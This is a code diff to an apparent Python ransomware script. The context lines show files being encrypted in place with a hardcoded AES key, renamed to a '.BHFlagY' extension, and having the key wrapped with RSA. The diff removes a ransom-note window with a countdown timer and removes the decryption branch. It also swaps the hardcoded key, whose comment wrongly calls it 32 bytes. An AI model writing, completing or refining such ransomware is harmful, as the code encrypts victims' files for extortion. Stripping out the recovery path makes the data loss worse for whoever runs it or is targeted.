@@ -62,69 +62,8 @@ def modify_file_inplace(filename, crypto, blocksize=16):
             f.write(out)
             chunk = f.read(blocksize)
 
-# ------ inlined gui.py ------
-
-try:
-    from tkinter import Tk, Label, PhotoImage
-    from tkinter.ttk import Style
-    GUI_AVAILABLE = True
-except ImportError:
-    GUI_AVAILABLE = False
-
-if GUI_AVAILABLE:
-    class RansomGUI(Tk):
-        def __init__(self, encrypted_key_b64):
-            super().__init__()
-            self.title("Warning!!!")
-            self.resizable(False, False)
-            self.configure(bg='black')
-            self.encrypted_key_b64 = encrypted_key_b64
-            self.style = Style(self)
-            self.style.theme_use("clam")
-
-            # display simple icon
-            photo_code = (
-                "R0lGODlhWAIOAtUAAAAAAAAAABAOABAQECAbACAgIC8pADAwMD83AEBAQE9EAFBQUF9SAGBgYG9fAHBwcH9tAH9/f"   # truncated for brevity
-            )
-            photo = PhotoImage(data=photo_code).subsample(4)
-            for col in (0, 3):
-                lbl = Label(self, image=photo, bg='black')
-                lbl.image = photo
-                lbl.grid(row=5, column=col, rowspan=2)
-
-            msg = "\n".join([
-                "[COMPANY_NAME]",
-                "YOUR NETWORK IS ENCRYPTED NOW",
-                "USE - TO GET THE PRICE FOR YOUR DATA",
-                "DO NOT GIVE THIS EMAIL TO 3RD PARTIES",
-                "DO NOT RENAME OR MOVE THE FILE",
-                "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY",
-                "[begin_key]",
-                encrypted_key_b64,
-                "[end_key]",
-                "KEEP IT"
-            ])
-            Label(self, text=msg, wraplength=550, font='Helvetica 14 bold',
-                  fg='white', bg='red').grid(row=0, column=0, columnspan=4)
-
-            self._start_timer()
-
-        def _start_timer(self):
-            def tick():
-                Label(self, text='TIME LEFT:', font='Helvetica 18 bold',
-                      fg='red', bg='black').grid(row=5, column=0, columnspan=4)
-                seconds = 36000  # 10 hours
-                while seconds > 0:
-                    m, s = divmod(seconds, 60)
-                    tl = f"{m:02d}:{s:02d}"
-                    Label(self, text=tl, font='Helvetica 18 bold',
-                          fg='red', bg='black').grid(row=6, column=0, columnspan=4)
-                    time.sleep(1)
-                    seconds -= 1
-            threading.Thread(target=tick, daemon=True).start()
-
 # ------ GLOBALS ------
-HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # 32-byte AES key
+HARDCODED_KEY = b'gK8DWJfcYU&3PL5#EC$a^Bdw'  # 32-byte AES key
 EXTENSION = ".BHFlagY"
 
 # Insert your actual RSA public key here (ASCII PEM, no ellipses):
@@ -225,10 +164,6 @@ def main():
     encrypted_b64 = base64.b64encode(encrypted).decode()
     print("Encrypted AES key (base64):", encrypted_b64, "\n")
 
-    # GUI popup if encrypting
-    if args.encrypt and GUI_AVAILABLE:
-        RansomGUI(encrypted_b64).mainloop()
-
     # choose AES key
     if args.encrypt:
         key = HARDCODED_KEY
@@ -248,12 +183,6 @@ def main():
                 modify_file_inplace(filepath, cipher.encrypt)
                 os.rename(filepath, filepath + EXTENSION)
                 print(f"Encrypted → {filepath + EXTENSION}")
-            if args.decrypt and filepath.endswith(EXTENSION):
-                modify_file_inplace(filepath, cipher.encrypt)
-                original = filepath[:-len(EXTENSION)]
-                os.rename(filepath, original)
-                print(f"Decrypted → {original}")
-
     # wipe key
     del key
 
